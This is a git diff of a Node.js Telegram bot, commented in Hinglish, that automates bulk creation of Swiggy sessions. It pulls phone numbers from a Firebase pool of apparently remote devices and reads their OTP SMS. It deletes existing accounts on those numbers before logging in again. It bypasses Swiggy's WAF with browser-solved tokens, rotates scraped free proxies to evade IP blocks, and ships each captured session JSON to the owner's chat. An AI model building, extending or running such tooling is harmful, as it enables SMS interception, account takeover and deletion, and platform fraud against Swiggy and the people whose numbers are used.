@@ -5,7 +5,7 @@
 //
 // Ek START ke baad ye apne aap chalta hai:
 //   1️⃣ Firebase pool (clients/) se number uthata — online devices pehle
-//   2️⃣ Swiggy OTP bhejta hai → 10s wait → isi Firebase (messages/) se
+//   2️⃣ Swiggy OTP bhejta hai → isi Firebase (messages/) se live poll karke
 //      OTP padh kar khud paste karta hai
 //   3️⃣ 🆕 naya number = register + session save
 //      ♻️ purana number = login → delete account → usi number se fresh login
@@ -33,18 +33,38 @@ process.env.FIREBASE_DB_URL ||= 'https://vuvhbjbi-default-rtdb.firebaseio.com/';
 // Dynamic import — defaults set karne KE BAAD hi modules load ho, warna
 // firebase-numbers.js env ko call-time par hi padhta hai, phir bhi safe side.
 const { Telegraf } = await import('telegraf');
-const { isBoss } = await import('./store.js');
+const {
+  isBoss,
+  hydrateAccountsFromCloudVault,
+  getSessionExportJson,
+  getDb,
+  findAccountKeyByPhone,
+} = await import('./store.js');
 const {
   startAutopilot,
   requestAutopilotStop,
   getAutopilotSnapshot,
   isAutopilotRunning,
 } = await import('./autopilot-engine.js');
-const { isFirebaseConfigured, firebaseSetupHintLines } = await import('./firebase-numbers.js');
+const { isFirebaseConfigured, firebaseSetupHintLines, listPoolNumbers } = await import('./firebase-numbers.js');
 const sources = await import('./firebase-sources.js');
 const bs = await import('./bot-settings.js');
 const proxyPool = await import('./proxy-pool.js');
+const { getChromeStatus } = await import('./swiggy-bridge.js');
+const wafPool = await import('./waf-pool.js');
 const { esc, section, sub, field } = await import('./rich-text.js');
+
+// ---------------------------------------------------------------------------
+// Process guards — ek stray async error poore bot ko NA maare.
+// (Pehle: koi bhi unhandled rejection/handler error = process band, aur
+// user ko sirf "bot work nahi kar raha" dikhta tha, wajah kabhi nahi.)
+// ---------------------------------------------------------------------------
+process.on('unhandledRejection', (err) => {
+  console.error('[FreshBot] unhandledRejection (bot chalta rahega):', err?.stack || err?.message || err);
+});
+process.on('uncaughtException', (err) => {
+  console.error('[FreshBot] uncaughtException (bot chalta rahega):', err?.stack || err?.message || err);
+});
 
 // ---------------------------------------------------------------------------
 // Config + owner gate
@@ -104,7 +124,7 @@ function startCard() {
     `baaki sab ye khud karega:`,
     ``,
     `1️⃣ Firebase pool se number (online pehle)`,
-    `2️⃣ Swiggy OTP → <b>10s wait</b> → OTP khud padh kar paste`,
+    `2️⃣ Swiggy OTP → <b>live inbox poll</b> → OTP khud padh kar paste`,
     `3️⃣ 🆕 naya = register · ♻️ purana = delete → fresh login`,
     `4️⃣ charges/order/wallet block = <b>SKIP</b> · WAF = <b>auto token-refresh + retry</b>`,
     ``,
@@ -125,16 +145,22 @@ function runningCard(snap, stageText = '') {
   return section('● Autopilot RUNNING', [
     field('Runtime', fmtDuration(snap.elapsedMs)),
     field('Target', String(snap.target)),
+    field('⚡ Parallel lanes', `${snap.activeWorkers || 0}/${snap.concurrency || 1} active`),
     stageText || '',
     ``,
     field('Processed', String(snap.processed)),
     field('✅ Fresh', `${snap.fresh}  (naye: ${snap.freshNew} · delete+fresh: ${snap.freshAfterDelete})`),
-    field('⚠️ Skipped', `${snap.skipped} · deferred: ${snap.deferred}`),
+    field('⚠️ Skipped', `${snap.skipped} · deferred: ${snap.deferred} · 7-day cooldown: ${snap.cooldownSkips || 0} · 📴 stale devices: ${snap.staleSkips || 0}`),
     field('× Failed', `${snap.failed} · rate-limit: ${snap.rateStrikes}`),
-    field('Pool', `${snap.poolFresh} fresh / ${snap.poolTotal} numbers`),
-    snap.current
-      ? `📍 <b>Abhi:</b> <code>${esc(snap.current.phone)}</code> (${fmtDuration(Date.now() - snap.current.startedAt)})`
+    field('Pool', snap.poolTotal ? `${snap.poolFresh} fresh / ${snap.poolTotal} numbers` : 'load ho raha hai…'),
+    (snap.scanning || snap.scanChecked)
+      ? field('🔎 Device scan', `pass ${snap.scanPass || 1}: ${snap.scanUniqueChecked || 0}/${snap.scanTotalDevices || 0} unique · probes ${snap.scanTotalProbes || snap.scanChecked || 0} · window ≤${fmtDuration(snap.scanWindowMs || 0)} · ${snap.scanBestActivityMs ? `scan ke waqt best SMS ~${fmtDuration(snap.scanBestActivityAgeMs || Math.max(0, Date.now() - snap.scanBestActivityMs))} purani · ` : ''}${snap.scanFresh || 0} fresh ready${snap.scanning ? ' · scanning…' : ''}`)
       : '',
+    (snap.activeNumbers?.length)
+      ? `📍 <b>Abhi ${snap.activeNumbers.length} lanes:</b>\n${snap.activeNumbers.slice(0, 10).map((n) => `• <code>${esc(n.phone)}</code> · lane ${n.laneId || '?'} · ${esc(n.proxyLabel || 'direct')} (${fmtDuration(Date.now() - n.startedAt)})`).join('\n')}`
+      : (snap.current
+        ? `📍 <b>Abhi:</b> <code>${esc(snap.current.phone)}</code> (${fmtDuration(Date.now() - snap.current.startedAt)})`
+        : (snap.scanning ? '🔎 Zinda devices dhoondh raha hoon (parallel scan)…' : '')),
     snap.lastError ? field('Last error', snap.lastError) : '',
   ].filter(Boolean).join('\n'));
 }
@@ -149,15 +175,16 @@ function summaryCard(snap) {
     ``,
     field('Processed', String(snap.processed)),
     field('✅ Fresh', `${snap.fresh}  (naye: ${snap.freshNew} · delete+fresh: ${snap.freshAfterDelete})`),
-    field('⚠️ Skipped', `${snap.skipped} · deferred: ${snap.deferred}`),
+    field('⚠️ Skipped', `${snap.skipped} · deferred: ${snap.deferred} · 7-day cooldown: ${snap.cooldownSkips || 0} · 📴 stale devices: ${snap.staleSkips || 0}`),
     field('× Failed', `${snap.failed} · rate-limit: ${snap.rateStrikes}`),
     field('Pool', `${snap.poolFresh} fresh / ${snap.poolTotal} numbers`),
+    snap.scanChecked ? field('🔎 Device scan', `pass ${snap.scanPass || 1}: ${snap.scanUniqueChecked || 0}/${snap.scanTotalDevices || 0} unique · total probes ${snap.scanTotalProbes || snap.scanChecked}`) : '',
     snap.lastError ? field('Last error', snap.lastError) : '',
     freshList ? `` : '',
     freshList ? `▤ <b>Latest fresh sessions:</b>` : '',
     freshList || sub('Abhi tak koi fresh session nahi bana.'),
     ``,
-    sub('Saare sessions data/db.json + cloud vault me saved hain (agar vault configured).'),
+    sub('Har fresh session ka JSON chat me file bana kar bhej diya gaya hai (data/db.json + cloud vault me bhi saved).'),
   ].filter((x) => x !== '' && x !== false).join('\n'));
 }
 
@@ -184,6 +211,7 @@ function settingsCard() {
     field('🔀 Proxies', ps.enabled ? `${ps.enabledCount}/${ps.total} ON — ${ps.rotation}` : 'OFF (rukna pad sakta hai)'),
     ``,
     field('🎯 Target', `${bs.getSetting('target')} fresh`),
+    field('⚡ Parallel lanes', `${bs.getSetting('concurrency')} numbers/IPs ek saath`),
     field('⏱ Max time', `${bs.getSetting('maxMinutes')} min`),
     field('🚦 Gap', bs.fmtSetting('gapMs')),
     field('⏳ OTP wait', bs.fmtSetting('otpWaitMs')),
@@ -197,9 +225,11 @@ const settingsRows = () => [
   [{ text: '🔥 Firebase Sources', callback_data: 'ap_sources', style: 'primary' }],
   [{ text: `🔀 Proxies: ${proxyPool.proxySummary().enabledCount}`, callback_data: 'ap_proxies', style: 'primary' }],
   [{ text: `🎯 Target: ${bs.getSetting('target')}`, callback_data: 'ap_pick_target' }],
+  [{ text: `⚡ Parallel: ${bs.getSetting('concurrency')} lanes`, callback_data: 'ap_pick_parallel' }],
   [{ text: `⏱ Max: ${bs.getSetting('maxMinutes')}m`, callback_data: 'ap_pick_time' }],
   [{ text: `🚦 Gap: ${bs.fmtSetting('gapMs')}`, callback_data: 'ap_pick_gap' }],
   [{ text: `📴 Offline: ${bs.getSetting('allowOffline') ? 'ON' : 'OFF'}`, callback_data: 'ap_toggle_offline' }],
+  [{ text: '🩺 Diagnose (kya toota hai?)', callback_data: 'ap_diag' }],
   [{ text: '↩️ Back', callback_data: 'ap_home', style: 'primary' }],
 ];
 
@@ -216,20 +246,23 @@ function proxiesCard() {
       callback_data: `ap_px_${p.id}`,
     },
   ]);
-  rows.push([{ text: '➕ Add Proxy', callback_data: 'ap_px_add', style: 'success' }]);
+  rows.push([{ text: '🌐 Free Proxies Lao (auto)', callback_data: 'ap_px_free', style: 'success' }]);
+  rows.push([{ text: '➕ Add Proxy (khud ki)', callback_data: 'ap_px_add' }]);
+  rows.push([{ text: `🌐 Free Auto: ${ps.autoFree ? 'ON' : 'OFF'}`, callback_data: 'ap_px_autotoggle' }]);
   rows.push([{ text: ps.enabled ? '⏸ Pause Rotation' : '▶️ Enable Rotation', callback_data: 'ap_px_rot' }]);
   rows.push([{ text: '↩️ Settings', callback_data: 'ap_settings', style: 'primary' }]);
   return {
     text: section('🔀 Proxy Pool — IP Rotation', [
       `Status: <b>${ps.enabled ? `ON (${ps.enabledCount}/${ps.total})` : 'OFF'}</b> — ${esc(ps.rotation)}`,
+      `🌐 Free auto-fetch: <b>${ps.autoFree ? 'ON' : 'OFF'}</b>${ps.autoCount ? ` · ${ps.autoCount} auto (${ps.autoClean || 0} clean${ps.autoChallenged ? ` · ${ps.autoChallenged} 🛡 WAF-ready` : ''})` : ''}`,
       ``,
       list.length
         ? list.map((p) =>
-            `${p.enabled ? (p.cooldownLeftMs > 0 ? `🟡 (${Math.ceil(p.cooldownLeftMs / 1000)}s)` : '▫️') : '🚫'} <b>${esc(p.label)}</b>${p.tokenReady ? ' 🔑' : ''} · hits: ${p.hits || 0}`
+            `${p.enabled ? (p.cooldownLeftMs > 0 ? `🟡 (${Math.ceil(p.cooldownLeftMs / 1000)}s)` : '▫️') : '🚫'} <b>${esc(p.label)}</b>${p.quality === 'challenged' ? ' 🛡' : ''}${p.tokenReady ? ' 🔑' : ''} · hits: ${p.hits || 0}`
           ).join('\n')
         : sub('Koi proxy nahi — abhi sab kuch EK IP se ja raha hai (rukne ka khatra).'),
       ``,
-      sub('Proxy add karte hi rotation ON. Ek IP blocked → bot turant doosri IP (ZERO wait).'),
+      sub('🌐 dabao — bot free proxy list se la kar sirf Swiggy par zinda wali rakhega. Batch start par bhi auto ho jata hai. Ek IP blocked → bot turant doosri IP (ZERO wait).'),
     ].join('\n')),
     rows,
   };
@@ -242,6 +275,7 @@ function proxyDetailCard(pxId) {
     text: section(`🔀 ${esc(p.label)}`, [
       `URL: <code>${esc(p.url.replace(/\/\/[^@]*@/, '//***:***@'))}</code>`,
       `Status: ${p.enabled ? '▫️ enabled' : '🚫 disabled'}${p.cooldownLeftMs > 0 ? ` · 🟡 WAF cooldown ${Math.ceil(p.cooldownLeftMs / 1000)}s` : ''}`,
+      p.auto ? `🌐 Free auto proxy${p.country ? ` · ${esc(p.country)}` : ''}${p.latencyMs ? ` · ⚡ ${p.latencyMs}ms (last check)` : ''}${p.quality === 'challenged' ? ' · 🛡 Swiggy WAF challenge deta hai — browser token solve karke chalegi' : ' · ✅ clean'} — marne par khud replace ho jayegi` : '',
       `WAF token: ${p.tokenReady ? '🔑 ready (per-proxy)' : '— (demand par banega)'}`,
       `Hits: ${p.hits || 0} · errors: ${p.consecutiveErrors || 0}`,
       ``,
@@ -311,6 +345,7 @@ const pickRows = (prefix, opts, extra = []) => [
 ];
 
 const TARGET_PRESETS = [10, 25, 50, 100, 200, 500].map((v) => ({ label: `${v}`, v }));
+const PARALLEL_PRESETS = [1, 3, 5, 10].map((v) => ({ label: `${v}`, v }));
 const TIME_PRESETS = [15, 30, 60, 120, 240, 480].map((v) => ({ label: `${v}m`, v }));
 const GAP_PRESETS = [
   { label: '0s', v: 0 }, { label: '5s', v: 5000 }, { label: '15s', v: 15000 },
@@ -329,6 +364,20 @@ if (!TOKEN) {
 // turant maar jaata tha). Default 90s rakhte hain; batch background me chalta
 // hai isliye handlers fast hi rehte hain.
 const bot = new Telegraf(TOKEN);
+
+// ⚠️ SABSE BADA FIX: pehle bot.catch hi nahi tha. Telegraf ka default error
+// handler error ko WAPAS throw karta hai → polling loop reject →
+// bot.launch() reject → process.exit(1). Matlab EK bhi handler me kahin
+// chhota sa error (message edit fail, Firebase slow, kuch bhi) = POORA BOT
+// BAND. Ab error log hoga, bot chalta rahega.
+bot.catch((err, ctx) => {
+  console.error(`[FreshBot] handler error (update ${ctx?.update?.update_id ?? '?'}):`, err?.stack || err?.message || err);
+  // User ko bhi bata do ke kuch gadbad hui (chup rehne se "bot dead hai" lagta hai).
+  // try/catch zaroori hai: message-update par answerCbQuery sync throw karta
+  // hai — error-handler khud throw kare to bot wapas marr jayega.
+  try { ctx?.reply?.('⚠️ Ek error aayi hai — console me details hain. /start dubara dabao, bot chal raha hai.')?.catch?.(() => {}); } catch {}
+  try { ctx?.answerCbQuery?.('⚠️ Error — /start dubara dabao')?.catch?.(() => {}); } catch {}
+});
 
 const gate = async (ctx) => {
   const uid = ctx.from?.id;
@@ -351,7 +400,84 @@ const sendLive = async (chatId, text, rows) => {
   });
 };
 
+// Document send kisi transient Telegram/network wajah se fail ho jaye to
+// fresh JSON phir bhi chat me poora bhejna hai. Text ko HTML-escape ke baad
+// ki lambai dekh kar tukdon me kaato taaki har message Telegram limit me rahe.
+function splitJsonForTelegram(jsonText, maxEscapedLength = 2400) {
+  const text = String(jsonText || '');
+  const chunks = [];
+  let start = 0;
+  while (start < text.length) {
+    let end = Math.min(text.length, start + maxEscapedLength);
+    while (end > start && esc(text.slice(start, end)).length > maxEscapedLength) end -= 1;
+    if (end === start) end = Math.min(text.length, start + 1);
+    chunks.push(text.slice(start, end));
+    start = end;
+  }
+  return chunks.length ? chunks : [''];
+}
+
+// Fresh JSON ki asal delivery — Autopilot ke instant send aur owner ke
+// /session resend command dono yahi use karte hain. Document 3 baar try;
+// phir bhi fail ho to poora JSON code-block hissoun me.
+async function deliverSessionJson(chatId, { phone, accountKey, kind, account } = {}) {
+  if (!chatId) return false;
+  const typeText = kind === 'fresh_after_delete'
+    ? '♻️ Delete + Fresh'
+    : kind === 'resend'
+      ? '↩️ Dobara Bheja'
+      : '🆕 Naya Fresh';
+  const caption = [
+    `✅ <b>Fresh Session Ready</b> — ${typeText}`,
+    `📱 <b>Number:</b> <code>${esc(phone || '')}</code>`,
+    `👤 <b>Account:</b> <b>${esc(accountKey || '')}</b>`,
+  ].join('\n');
+
+  const exportData = getSessionExportJson(accountKey, account);
+  if (!exportData) {
+    await bot.telegram.sendMessage(chatId,
+      `${caption}\n\n<i>(JSON export nahi mil paya — session bot DB me saved hai)</i>`,
+      { parse_mode: 'HTML' }).catch(() => {});
+    return false;
+  }
+
+  const jsonText = JSON.stringify(exportData, null, 2);
+  const filename = `${phone || accountKey || 'session'}.json`;
+  let lastDocumentError = null;
+
+  for (let attempt = 1; attempt <= 3; attempt++) {
+    try {
+      await bot.telegram.sendDocument(chatId,
+        { source: Buffer.from(jsonText, 'utf8'), filename },
+        { caption, parse_mode: 'HTML' });
+      return true;
+    } catch (e) {
+      lastDocumentError = e;
+      console.warn(`[FreshBot] session file send (try ${attempt}/3):`, e?.message);
+      if (attempt < 3) await new Promise((resolve) => setTimeout(resolve, attempt * 800));
+    }
+  }
+
+  const chunks = splitJsonForTelegram(jsonText);
+  let sentChunks = 0;
+  for (let i = 0; i < chunks.length; i++) {
+    const heading = i === 0
+      ? `${caption}\n\n<i>Document send fail (${esc(String(lastDocumentError?.message || 'unknown error').slice(0, 160))}) — JSON neeche hissa ${i + 1}/${chunks.length} me bhej raha hoon.</i>`
+      : `<b>${esc(filename)}</b> — JSON hissa ${i + 1}/${chunks.length}`;
+    const sent = await bot.telegram.sendMessage(
+      chatId,
+      `${heading}\n\n<pre>${esc(chunks[i])}</pre>`,
+      { parse_mode: 'HTML' }
+    ).catch((e) => console.warn(`[FreshBot] session JSON chunk ${i + 1}/${chunks.length}:`, e?.message));
+    if (sent) sentChunks++;
+  }
+  return sentChunks === chunks.length;
+}
+
 async function launchBatch(ctx) {
+  // Pehle yahan owner-gate tha hi nahi — koi bhi START daba kar batch chala
+  // sakta tha (bot username janna hi kaafi tha).
+  if (!(await gate(ctx))) return;
   if (isAutopilotRunning()) {
     await ctx.answerCbQuery('Pehle se chal raha hai!').catch(() => {});
     return;
@@ -387,6 +513,13 @@ async function launchBatch(ctx) {
         }
       }
     },
+
+    // 📤 Fresh session bante HI uska JSON isi chat me FILE bana kar bhej do
+    // (boss ki demand: "jaise koi bhi fresh JSON mile, same time par chat
+    // me send karna hai"). Batch ka end/summary ka wait bilkul nahi.
+    async sendSession(payload = {}) {
+      await deliverSessionJson(ctx.chat?.id || fallback.chatId, payload);
+    },
   };
 
   startAutopilot({
@@ -409,13 +542,122 @@ bot.start(async (ctx) => {
   await ctx.reply(startCard(), kb(isAutopilotRunning() ? stopRows() : startRows())).catch(() => {});
 });
 
-bot.help((ctx) => ctx.reply('/start — menu · /status — current batch', { parse_mode: 'HTML' }).catch(() => {}));
+bot.help((ctx) => ctx.reply('/start — menu · /status — current batch · /diag — kya toota hai, check karo · /session <number> — saved fresh JSON dobara bhejo', { parse_mode: 'HTML' }).catch(() => {}));
+
+// ---------------------------------------------------------------------------
+// 🩺 /diag — "bot work nahi kar raha" ka jawab ek tap me.
+// Firebase reachable? Pool me numbers? Chrome mila? WAF token? Sab check.
+// ---------------------------------------------------------------------------
+async function diagCard() {
+  const lines = [];
+  lines.push(field('Node', process.version));
+  // Chrome (WAF solver ke liye zaroori)
+  try {
+    const c = getChromeStatus();
+    lines.push(field('🌐 Chrome', c.found ? `✅ mila — <code>${esc(c.path)}</code>${c.headless ? ' (headless)' : ''}` : '❌ NAHI mila — Chrome install karo ya .env me PUPPETEER_EXECUTABLE_PATH do'));
+  } catch { lines.push(field('🌐 Chrome', '—')); }
+  // WAF token
+  try {
+    wafPool.loadFromDb?.(); // db.json me saved token bhi dikhe (warna hamesha "nahi hai" lagega)
+    const w = wafPool.getSummary();
+    lines.push(field('🛡 WAF token', w.hasToken ? `✅ hai (age ${w.tokenAgeMin}m, ${esc(w.source)})` : (w.stale ? '⚠️ purana/expired — batch start par naya banega (Chrome chahiye)' : '— abhi nahi (batch start par banega)')));
+  } catch { lines.push(field('🛡 WAF token', '—')); }
+  // Firebase (active source verify = shallow root read, halka test)
+  try {
+    const src = sources.getActiveSource();
+    if (src) {
+      const t0 = Date.now();
+      const v = await sources.verifySource(src.id);
+      lines.push(field('🔥 Firebase', v.ok
+        ? `✅ reachable ${Date.now() - t0}ms — ${esc(src.name)}`
+        : `❌ ${esc(v.error || 'unreachable')} — URL/auth/rules check karo`));
+    } else {
+      lines.push(field('🔥 Firebase', '❌ koi active source nahi (⚙️ Settings → Firebase Sources)'));
+    }
+  } catch (e) { lines.push(field('🔥 Firebase', `❌ ${esc(String(e?.message || e).slice(0, 120))}`)); }
+  // Pool count (asli test — thoda slow ho sakta hai, isliye alag try)
+  try {
+    sources.applyActiveSource();
+    const pool = await listPoolNumbers();
+    const online = pool.filter((p) => p.online !== false).length;
+    lines.push(field('📱 Number pool', pool.length ? `✅ ${pool.length} numbers (${online} online)` : '❌ 0 numbers mile — Firebase clients/ node khali ya paths galat'));
+  } catch (e) { lines.push(field('📱 Number pool', `❌ ${esc(String(e?.message || e).slice(0, 140))}`)); }
+  // Device last-seen gate
+  {
+    const w = Number(process.env.PREMIUM_DEVICE_ACTIVE_WINDOW_MS);
+    const wMs = Number.isFinite(w) && w > 0 ? w : 60_000;
+    lines.push(field('📟 Device gate', `sirf wahi devices jinki last activity ≤${Math.round(wMs / 1000)}s purani ho (env PREMIUM_DEVICE_ACTIVE_WINDOW_MS se badal sakta hai)`));
+  }
+  // Proxies
+  try {
+    const ps = proxyPool.proxySummary();
+    lines.push(field('🔀 Proxies', ps.enabled ? `✅ ${ps.enabledCount}/${ps.total} ON` : '⚠️ OFF (ek hi IP — rukna pad sakta hai)'));
+  } catch { lines.push(field('🔀 Proxies', '—')); }
+  const snap = getAutopilotSnapshot();
+  lines.push(field('▶️ Batch', snap.running ? `● RUNNING — ${snap.fresh}/${snap.target} fresh` : (snap.finishedAt ? `⏹ last: ${snap.fresh} fresh · ${esc(snap.stopReason || 'done')}${snap.lastError ? ` · last error: ${esc(String(snap.lastError).slice(0, 100))}` : ''}` : 'ready')));
+  return section('🩺 Diagnose — kya toota hai?', [
+    ...lines,
+    '',
+    sub('Jahan ❌ hai wahi problem hai. Sab ✅ ho aur phir bhi batch fail ho to console logs dekho — har number ka exact reason wahan likhta hai.'),
+  ].join('\n'));
+}
+
+bot.command('diag', async (ctx) => {
+  if (!isOwner(ctx.from?.id)) return;
+  const wait = await ctx.reply('🩺 Check kar raha hoon… (pool test me ~15s lag sakta hai)').catch(() => null);
+  const text = await diagCard();
+  if (wait) {
+    await ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, undefined, text, kb(idleRows())).catch(async () => {
+      await ctx.reply(text, kb(idleRows())).catch(() => {});
+    });
+  } else {
+    await ctx.reply(text, kb(idleRows())).catch(() => {});
+  }
+});
 
 bot.command('status', async (ctx) => {
   if (!isOwner(ctx.from?.id)) return;
   const snap = getAutopilotSnapshot();
   await ctx.reply(snap.running || snap.finishedAt ? summaryCard(snap) : startCard(),
     kb(snap.running ? stopRows() : idleRows())).catch(() => {});
+});
+
+// Kisi fresh session ka JSON pehli baar send fail ho jaye to owner usi ko
+// dobara manga sakta hai: /session 9876543210  ya  /session acc_9876543210
+bot.command('session', async (ctx) => {
+  if (!isOwner(ctx.from?.id)) return;
+  const query = String(ctx.message?.text || '').trim().split(/\s+/)[1] || '';
+  if (!query) {
+    await ctx.reply('Usage: <code>/session 9876543210</code> ya <code>/session acc_9876543210</code>', { parse_mode: 'HTML' }).catch(() => {});
+    return;
+  }
+
+  const accounts = getDb()?.config?.accounts || {};
+  const digits = query.replace(/\D/g, '');
+  const phone10 = digits.length >= 10 ? digits.slice(-10) : '';
+  const accountKey = accounts[query]
+    ? query
+    : phone10 && accounts[`acc_${phone10}`]
+      ? `acc_${phone10}`
+      : phone10
+        ? findAccountKeyByPhone(accounts, phone10)
+        : null;
+  const account = accountKey ? accounts[accountKey] : null;
+  if (!accountKey || !account) {
+    await ctx.reply(`❌ Session nahi mila: <code>${esc(query)}</code>`, { parse_mode: 'HTML' }).catch(() => {});
+    return;
+  }
+
+  const phone = String(account.phone || account.mobile || phone10 || '').replace(/\D/g, '').slice(-10);
+  const delivered = await deliverSessionJson(ctx.chat?.id, {
+    phone,
+    accountKey,
+    kind: 'resend',
+    account,
+  });
+  if (!delivered && getSessionExportJson(accountKey, account)) {
+    await ctx.reply('⚠️ JSON phir bhi poora send nahi ho paya — thodi der baad /session dobara try karo.', { parse_mode: 'HTML' }).catch(() => {});
+  }
 });
 
 bot.action('ap_start', launchBatch);
@@ -480,6 +722,14 @@ bot.action('ap_settings', async (ctx) => {
   if (!(await gate(ctx))) return;
   await ctx.answerCbQuery().catch(() => {});
   await editOrSend(ctx, settingsCard(), settingsRows());
+});
+
+bot.action('ap_diag', async (ctx) => {
+  if (!(await gate(ctx))) return;
+  await ctx.answerCbQuery('🩺 Checking…').catch(() => {});
+  await editOrSend(ctx, '🩺 Check kar raha hoon… (pool test me ~15s lag sakta hai)', [[{ text: '↩️ Settings', callback_data: 'ap_settings', style: 'primary' }]]);
+  const text = await diagCard();
+  await editOrSend(ctx, text, [[{ text: '↩️ Settings', callback_data: 'ap_settings', style: 'primary' }]]);
 });
 
 bot.action('ap_sources', async (ctx) => {
@@ -569,7 +819,7 @@ bot.action('ap_proxies', async (ctx) => {
   await editOrSend(ctx, text, rows);
 });
 
-bot.action(/^ap_px_(?!add$|rot$)([a-f0-9-]{1,10})$/, async (ctx) => {
+bot.action(/^ap_px_(?!add$|rot$|free$|autotoggle$)([a-f0-9-]{1,10})$/, async (ctx) => {
   if (!(await gate(ctx))) return;
   await ctx.answerCbQuery().catch(() => {});
   const { text, rows } = proxyDetailCard(ctx.match[1]);
@@ -597,6 +847,73 @@ bot.action('ap_px_rot', async (ctx) => {
   const cur = proxyPool.proxySummary().enabled;
   const r = proxyPool.setPoolEnabled(!cur);
   await ctx.answerCbQuery(r.ok ? (r.enabled ? '▶️ Rotation ON' : '⏸ Rotation OFF') : `❌ ${r.error}`, !r.ok && { show_alert: true }).catch(() => {});
+  const { text, rows } = proxiesCard();
+  await editOrSend(ctx, text, rows);
+});
+
+// 🌐 Free Proxies Lao — kai public lists se la kar pehle generic HTTPS,
+// phir seedha Swiggy par test. Clean pehle; WAF-challenged lekin reachable
+// proxies bhi fallback tier me pool me rehti hain (token solve se chalti hain).
+bot.action('ap_px_free', async (ctx) => {
+  if (!(await gate(ctx))) return;
+  await ctx.answerCbQuery('🌐 Free proxies dhoondh raha hoon…').catch(() => {});
+  const backRows = [[{ text: '↩️ Proxies', callback_data: 'ap_proxies', style: 'primary' }]];
+  await editOrSend(ctx, section('🌐 Free Proxies La Raha Hoon', [
+    '› Kai public free lists se candidates la raha hoon…',
+    '› Har ek ko pehle HTTPS, phir <b>seedha Swiggy par test</b> kar raha hoon…',
+    '',
+    sub('Zinda proxies kam milen to 1–2 minute lag sakte hain. Progress yahi card par dikhega.'),
+  ].join('\n')), backRows);
+  let finished = false;
+  let lastProgressAt = 0;
+  let progressPromise = Promise.resolve();
+  try {
+    const r = await proxyPool.refreshFreeProxies({
+      want: 10,
+      onProgress: ({ checked = 0, clean = 0, challenged = 0, total = 0 } = {}) => {
+        const now = Date.now();
+        if (finished || now - lastProgressAt < 10_000) return;
+        lastProgressAt = now;
+        progressPromise = editOrSend(ctx, section('🌐 Free Proxies Test Ho Rahi Hain', [
+          `🧪 Parkhin: <b>${checked}${total ? `/${total}` : ''}</b>`,
+          `✅ Clean mili: <b>${clean}</b>`,
+          `🛡 Swiggy-reachable (WAF challenge): <b>${challenged}</b>`,
+          '',
+          sub('Clean 10 milte hi ruk jaunga; warna deadline tak best fallback bhi jama karunga.'),
+        ].join('\n')), backRows).catch(() => {});
+      },
+    });
+    finished = true;
+    await progressPromise.catch(() => {});
+    const ps = proxyPool.proxySummary();
+    const reasons = (r?.stats?.reasons || []).slice(0, 3)
+      .map((x) => `${x.reason}×${x.count}`).join(', ');
+    await editOrSend(ctx, section('🌐 Free Proxies — Result', [
+      r?.added
+        ? `✅ <b>${r.added} proxies</b> pool me daal di — ${r.keptClean || 0} clean + ${r.keptChallenged || 0} 🛡 WAF-ready.`
+        : `⚠️ Is baar koi bhi proxy Swiggy tak nahi pohanchi. Thodi der baad phir dabana — free proxies aati-jaati rehti hain.`,
+      `📥 Sources: <b>${r?.sourcesOk || 0}/${r?.sourcesTotal || 0}</b> · candidates: <b>${r?.candidates || 0}</b> · parkhin: <b>${r?.checked || 0}</b>`,
+      `🔀 Pool ab: <b>${ps.enabledCount}/${ps.total} ON</b> (${ps.autoCount} auto) — ${esc(ps.rotation)}`,
+      reasons ? sub(`Dead ki top wajuhat: ${esc(reasons)}`) : '',
+      '',
+      sub('Clean proxies pehle use hongi; 🛡 wali par browser WAF token solve hoga. Mari hui auto proxies agle refresh par khud nikal jayengi.'),
+    ].filter(Boolean).join('\n')), backRows);
+  } catch (e) {
+    finished = true;
+    await progressPromise.catch(() => {});
+    await editOrSend(ctx, section('🌐 Free Proxies — Fail', [
+      `❌ <code>${esc(String(e?.message || e).slice(0, 200))}</code>`,
+      sub('Kuch list sources down ho sakte hain — thodi der baad phir try karo, ya apni proxy ➕ se add kar do.'),
+    ].join('\n')), backRows);
+  }
+});
+
+// 🌐 Auto-fetch on/off (batch-start par khud laana)
+bot.action('ap_px_autotoggle', async (ctx) => {
+  if (!(await gate(ctx))) return;
+  const cur = proxyPool.proxySummary().autoFree;
+  const r = proxyPool.setAutoFree(!cur);
+  await ctx.answerCbQuery(r.autoFree ? '🌐 Free auto-fetch ON' : '🌐 Free auto-fetch OFF').catch(() => {});
   const { text, rows } = proxiesCard();
   await editOrSend(ctx, text, rows);
 });
@@ -645,6 +962,23 @@ bot.action('ap_custom_target', async (ctx) => {
     `Kitne fresh sessions chahiye? <b>Number likh kar bhejo</b> (1–5000):`,
     `Jaise: <code>150</code>`,
   ].join('\n')), [[{ text: '↩️ Cancel', callback_data: 'ap_settings', style: 'primary' }]]);
+});
+
+bot.action('ap_pick_parallel', async (ctx) => {
+  if (!(await gate(ctx))) return;
+  await ctx.answerCbQuery().catch(() => {});
+  await editOrSend(ctx, section('⚡ Parallel Lanes — ek saath kitne numbers?', [
+    `Abhi: <b>${bs.getSetting('concurrency')}</b> lanes`,
+    ``,
+    sub('Har active lane alag number + alag proxy/IP legi. Jitni usable IPs hongi utni lanes asal me chalengi; proxy na ho to direct sirf 1 lane hogi.'),
+  ].join('\n')), pickRows('ap_set_parallel_', PARALLEL_PRESETS));
+});
+
+bot.action(/^ap_set_parallel_(\d+)$/, async (ctx) => {
+  if (!(await gate(ctx))) return;
+  const r = bs.setSetting('concurrency', Number(ctx.match[1]));
+  await ctx.answerCbQuery(r.ok ? `⚡ Parallel = ${r.value} lanes` : `❌ ${r.error}`, !r.ok && { show_alert: true }).catch(() => {});
+  await editOrSend(ctx, settingsCard(), settingsRows());
 });
 
 bot.action('ap_pick_time', async (ctx) => {
@@ -757,14 +1091,145 @@ bot.on('callback_query', async (ctx) => {
   await ctx.answerCbQuery().catch(() => {});
 });
 
-try {
-  await bot.launch({ dropPendingUpdates: true }, () => {
-    console.log('🆕 Swiggy Fresh Bot chal raha hai — START dabao, phone chhod ke aa jao.');
-  });
-} catch (e) {
-  console.error('[FreshBot] launch failed:', e?.message || e);
-  process.exit(1);
+// ---------------------------------------------------------------------------
+// 🚀 Launch — preflight + retry ke saath.
+// PEHLE KE BUGS:
+//  1) Ek hi network jhatka (TLS disconnect waghera) = "launch failed" bolkar
+//     bot seedha band. Ab getMe preflight 6 baar retry karega.
+//  2) 401/409 par wajah samajh hi nahi aati thi. Ab saaf bataega:
+//       401 = BOT_TOKEN galat/revoke ho chuka
+//       409 = isi token se DOOSRI copy pehle se chal rahi hai
